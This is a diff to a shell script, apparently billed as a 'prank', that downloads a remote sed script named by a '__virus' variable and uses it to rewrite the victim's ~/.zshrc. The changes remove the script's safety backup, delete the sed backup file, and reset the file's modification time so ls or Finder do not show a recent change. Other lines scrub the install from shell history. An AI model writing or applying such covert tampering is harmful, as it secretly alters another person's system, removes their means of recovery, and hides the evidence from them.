@@ -10,10 +10,14 @@ if ! curl -fsSL "$BASE/$__virus" -o "$__tmp"; then
   return 1 2>/dev/null || exit 1
 fi
 
-# 誤爆時の最終保険（reset_all.sh が掃除する）
-cp ~/.zshrc ~/.zshrc.PRANKBAK 2>/dev/null
+# 変更時刻を戻すための基準を一時退避（home にはファイルを残さない）
+__ref="$(mktemp)"
+touch -r ~/.zshrc "$__ref" 2>/dev/null
 sed -i".aonaon" -f "$__tmp" ~/.zshrc
-rm -f "$__tmp"
+rm -f "$__tmp" ~/.zshrc.aonaon
+# ls -l / Finder で「最近変更」とバレないよう mtime を戻す
+touch -r "$__ref" ~/.zshrc 2>/dev/null
+rm -f "$__ref"
 
 # 履歴ファイルから導入の痕跡を消す（macOSには tac が無いので tail -r）
 if [ -n "$HISTFILE" ] && [ -f "$HISTFILE" ]; then
@@ -29,4 +33,4 @@ fi
 
 source ~/.zshrc
 fc -R 2>/dev/null
-unset __virus __tmp
+unset __virus __tmp __ref
